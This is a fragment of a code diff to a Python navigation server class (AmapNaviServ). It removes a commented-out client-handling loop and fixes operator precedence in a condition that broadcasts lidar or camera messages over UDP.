-                self.shared_data.ext_blinker = BLINKER_NONE
-                self.blinker_alive = False
-
-              with lock:
-                if self.clients:
-                  self.shared_data.ext_state = len(self.clients)
-                else:
-                  self.shared_data.ext_state = 0
-                  self.shared_data.ext_blinker = BLINKER_NONE
-
-              self.shared_data.ext_blinker = self.shared_data.ext_blinker
-
-            except Exception as e:
-              print(f"navi_comm_thread: recv error...: {e}")
-              break
-
-          time.sleep(1)
-      except Exception as e:
-        print(f"Network error, retrying...: {e}")
-        time.sleep(2)
-  '''
-
   def navi_broadcast_info(self):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
@@ -1486,7 +1253,7 @@ class AmapNaviServ:
                         sock.sendto(navi_dat, (ip, port))
                         if (self.shared_data.showDebugLog & 32) > 0:
                           print(f"sendto {ip} (overtake): {navi_dat}")
-                    elif device_type == "lidar" or device_type == "camera" and ((frame % 10) == 0):  # 雷达模块
+                    elif (device_type == "lidar" or device_type == "camera") and ((frame % 10) == 0):  # 雷达模块
                       if lidar_msg is None:
                         lidar_msg = self.make_lidar_message()
                         lidar_dat = lidar_msg.encode('utf-8')
